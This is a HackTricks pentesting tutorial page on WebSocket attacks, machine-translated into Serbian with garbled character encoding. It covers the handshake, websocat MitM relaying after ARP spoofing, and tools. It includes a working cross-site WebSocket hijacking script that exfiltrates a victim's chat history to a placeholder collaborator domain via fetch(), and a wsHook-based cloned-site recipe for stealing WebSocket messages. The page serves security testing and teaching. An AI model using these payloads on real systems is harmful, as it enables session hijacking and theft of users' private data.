# WebSocket Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Å ta su WebSocketi

WebSocket veze se uspostavljaju kroz inicijalni **HTTP** handshake i dizajnirane su da budu **dugoroÄne**, omoguÄ‡avajuÄ‡i dvosmerno slanje poruka u bilo kojem trenutku bez potrebe za transakcionim sistemom. Ovo Äini WebSocket-e posebno korisnim za aplikacije koje zahtevaju **nisku latenciju ili komunikaciju iniciranu sa servera**, kao Å¡to su strimovi uÅ¾ivo finansijskih podataka.

### Uspostavljanje WebSocket Veza

Detaljno objaÅ¡njenje o uspostavljanju WebSocket veza moÅ¾e se pronaÄ‡i [**ovde**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Ukratko, WebSocket veze se obiÄno iniciraju putem JavaScript-a na klijentskoj strani kao Å¡to je prikazano u nastavku:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` Ğ¿Ñ€Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ» Ğ¾Ğ·Ğ½Ğ°Ñ‡Ğ°Ğ²Ğ° WebSocket Ğ²ĞµĞ·Ñƒ Ğ·Ğ°ÑˆÑ‚Ğ¸Ñ›ĞµĞ½Ñƒ **TLS**, Ğ´Ğ¾Ğº `ws` ÑƒĞºĞ°Ğ·ÑƒÑ˜Ğµ Ğ½Ğ° **Ğ½ĞµĞ¾Ğ±ĞµĞ·Ğ±ĞµÑ’ĞµĞ½Ñƒ** Ğ²ĞµĞ·Ñƒ.

Ğ¢Ğ¾ĞºĞ¾Ğ¼ ÑƒÑĞ¿Ğ¾ÑÑ‚Ğ°Ğ²Ñ™Ğ°ÑšĞ° Ğ²ĞµĞ·Ğµ, Ğ¸Ğ·Ğ²Ğ¾Ğ´Ğ¸ ÑĞµ Ñ€ÑƒĞºĞ¾Ğ²Ğ°ÑšĞµ Ğ¸Ğ·Ğ¼ĞµÑ’Ñƒ Ğ±Ñ€Ğ°ÑƒĞ·ĞµÑ€Ğ° Ğ¸ ÑĞµÑ€Ğ²ĞµÑ€Ğ° Ğ¿Ñ€ĞµĞºĞ¾ HTTP. ĞŸÑ€Ğ¾Ñ†ĞµÑ Ñ€ÑƒĞºĞ¾Ğ²Ğ°ÑšĞ° ÑƒĞºÑ™ÑƒÑ‡ÑƒÑ˜Ğµ ÑĞ»Ğ°ÑšĞµ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ° Ğ¾Ğ´ ÑÑ‚Ñ€Ğ°Ğ½Ğµ Ğ±Ñ€Ğ°ÑƒĞ·ĞµÑ€Ğ° Ğ¸ Ğ¾Ğ´Ğ³Ğ¾Ğ²Ğ¾Ñ€ ÑĞµÑ€Ğ²ĞµÑ€Ğ°, ĞºĞ°Ğ¾ ÑˆÑ‚Ğ¾ Ñ˜Ğµ Ğ¸Ğ»ÑƒÑÑ‚Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¾ Ñƒ ÑĞ»ĞµĞ´ĞµÑ›Ğ¸Ğ¼ Ğ¿Ñ€Ğ¸Ğ¼ĞµÑ€Ğ¸Ğ¼Ğ°:

Ğ‘Ñ€Ğ°ÑƒĞ·ĞµÑ€ ÑˆĞ°Ñ™Ğµ Ğ·Ğ°Ñ…Ñ‚ĞµĞ² Ğ·Ğ° Ñ€ÑƒĞºĞ¾Ğ²Ğ°ÑšĞµ:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Odgovor serverovog rukovanja:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Konekcija ostaje otvorena za razmenu poruka u oba pravca nakon uspostavljanja.

**KljuÄne taÄke WebSocket rukovanja:**

- `Connection` i `Upgrade` zaglavlja signaliziraju inicijaciju WebSocket rukovanja.
- `Sec-WebSocket-Version` zaglavlje oznaÄava Å¾eljenu verziju WebSocket protokola, obiÄno `13`.
- Base64-enkodirana nasumiÄna vrednost se Å¡alje u `Sec-WebSocket-Key` zaglavlju, osiguravajuÄ‡i da je svako rukovanje jedinstveno, Å¡to pomaÅ¾e u spreÄavanju problema sa keÅ¡iranjem proksija. Ova vrednost nije za autentifikaciju, veÄ‡ da potvrdi da odgovor nije generisan od strane pogreÅ¡no konfigurisane server ili keÅ¡a.
- `Sec-WebSocket-Accept` zaglavlje u odgovoru servera je heÅ¡ od `Sec-WebSocket-Key`, verifikujuÄ‡i nameru servera da otvori WebSocket konekciju.

Ove karakteristike osiguravaju da je proces rukovanja siguran i pouzdan, otvarajuÄ‡i put za efikasnu komunikaciju u realnom vremenu.


### Linux konzola

MoÅ¾ete koristiti `websocat` za uspostavljanje sirove konekcije sa websocket-om.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ili da kreirate websocat server:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket veze

Ako otkrijete da su klijenti povezani na **HTTP websocket** iz vaÅ¡e trenutne lokalne mreÅ¾e, moÅ¾ete pokuÅ¡ati sa [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) da izvrÅ¡ite MitM napad izmeÄ‘u klijenta i servera.\
Kada klijent pokuÅ¡a da se poveÅ¾e, moÅ¾ete koristiti:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeracija

MoÅ¾ete koristiti **alat** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **da automatski otkrijete, identifikujete i pretraÅ¾ujete poznate** **ranjivosti** u websockets.

### Websocket Debug alati

* **Burp Suite** podrÅ¾ava MitM websockets komunikaciju na vrlo sliÄan naÄin kao Å¡to to radi za regularnu HTTP komunikaciju.
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite ekstenzija** Ä‡e vam omoguÄ‡iti bolje upravljanje Websocket komunikacijama u Burp-u dobijanjem **istorije**, postavljanjem **pravila za presretanje**, koriÅ¡Ä‡enjem **pravila za usklaÄ‘ivanje i zamenu**, koriÅ¡Ä‡enjem **Intruder** i **AutoRepeater.**
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** SkraÄ‡eno od "**WebSocket/Socket.io Proxy**", ovaj alat, napisan u Node.js, pruÅ¾a korisniÄki interfejs za **hvatanje, presretanje, slanje prilagoÄ‘enih** poruka i pregled svih WebSocket i Socket.IO komunikacija izmeÄ‘u klijenta i servera.
* [**wsrepl**](https://github.com/doyensec/wsrepl) je **interaktivni websocket REPL** dizajniran posebno za penetraciono testiranje. PruÅ¾a interfejs za posmatranje **dolaznih websocket poruka i slanje novih**, sa jednostavnim okvirom za **automatizaciju** ove komunikacije.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) je **web za komunikaciju** sa drugim webovima koristeÄ‡i **websockets**.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) izmeÄ‘u ostalih tipova komunikacija/protokola, pruÅ¾a **web za komunikaciju** sa drugim webovima koristeÄ‡i **websockets.**

## Websocket Lab

U [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) imate kod za pokretanje web-a koristeÄ‡i websockets, a u [**ovom postu**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) moÅ¾ete pronaÄ‡i objaÅ¡njenje.

## Cross-site WebSocket otmica (CSWSH)

**Cross-site WebSocket otmica**, takoÄ‘e poznata kao **cross-origin WebSocket otmica**, identifikovana je kao specifiÄan sluÄaj **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** koji utiÄe na WebSocket rukovanja. Ova ranjivost se javlja kada WebSocket rukovanja autentifikuju iskljuÄivo putem **HTTP kolaÄiÄ‡a** bez **CSRF tokena** ili sliÄnih bezbednosnih mera.

NapadaÄi mogu iskoristiti ovo tako Å¡to Ä‡e hostovati **zloÄ‡udnu web stranicu** koja inicira cross-site WebSocket vezu sa ranjivom aplikacijom. Kao rezultat, ova veza se tretira kao deo sesije Å¾rtve sa aplikacijom, koristeÄ‡i nedostatak CSRF zaÅ¡tite u mehanizmu upravljanja sesijama.

### Jednostavan napad

Imajte na umu da kada **uspostavljate** **websocket** vezu, **kolaÄiÄ‡** se **Å¡alje** serveru. **Server** ga moÅ¾e koristiti da **poveÅ¾e** svakog **specifiÄnog** **korisnika** sa njegovom **websocket** **sesijom na osnovu poslatog kolaÄiÄ‡a**.

Zatim, ako na **primer** **websocket** **server** **vrati istoriju razgovora** korisnika ako se poÅ¡alje poruka sa "**READY"**, tada Ä‡e **jednostavan XSS** koji uspostavlja vezu (**kolaÄiÄ‡** Ä‡e biti **poslat** **automatski** da autorizuje korisnika Å¾rtvu) **slanjem** "**READY**" moÄ‡i da **dobije** istoriju **razgovora**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

U ovom blog postu [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) napadaÄ je uspeo da **izvrÅ¡i proizvoljni Javascript u poddomeni** domena gde je komunikacija putem web socket-a bila u toku. PoÅ¡to je to bila **poddomena**, **cookie** je bio **poslat**, a poÅ¡to **Websocket nije pravilno proveravao Origin**, bilo je moguÄ‡e komunicirati s njom i **ukrasti tokene iz nje**.

### Stealing data from user

Kopirajte web aplikaciju koju Å¾elite da imitirate (npr. .html fajlove) i unutar skripte gde se odvija websocket komunikacija dodajte ovaj kod:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Sada preuzmite `wsHook.js` datoteku sa [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) i **saÄuvajte je unutar fascikle sa web datotekama**.\
Izlaganjem web aplikacije i omoguÄ‡avanjem korisniku da se poveÅ¾e na nju, moÄ‡i Ä‡ete da ukradete poslate i primljene poruke putem websocket-a:
```javascript
sudo python3 -m http.server 80
```
## Race Conditions

Race Conditions u WebSocket-ima su takoÄ‘e stvar, [proverite ove informacije da biste saznali viÅ¡e](race-condition.md#rc-in-websockets).

## Other vulnerabilities

PoÅ¡to su Web Sockets mehanizam za **slanje podataka na serversku i klijentsku stranu**, u zavisnosti od toga kako server i klijent obraÄ‘uju informacije, **Web Sockets se mogu koristiti za iskoriÅ¡Ä‡avanje nekoliko drugih ranjivosti kao Å¡to su XSS, SQLi ili bilo koja druga uobiÄajena web ranjivost koristeÄ‡i unos korisnika iz websocket-a.**

## **WebSocket Smuggling**

Ova ranjivost bi mogla omoguÄ‡iti da **zaobiÄ‘ete ograniÄenja obrnute proxy usluge** tako Å¡to Ä‡e ih naterati da veruju da je **websocket komunikacija uspostavljena** (Äak i ako to nije taÄno). Ovo bi moglo omoguÄ‡iti napadaÄu da **pristupi skrivenim krajnjim taÄkama**. Za viÅ¡e informacija proverite sledeÄ‡u stranicu:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## References

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
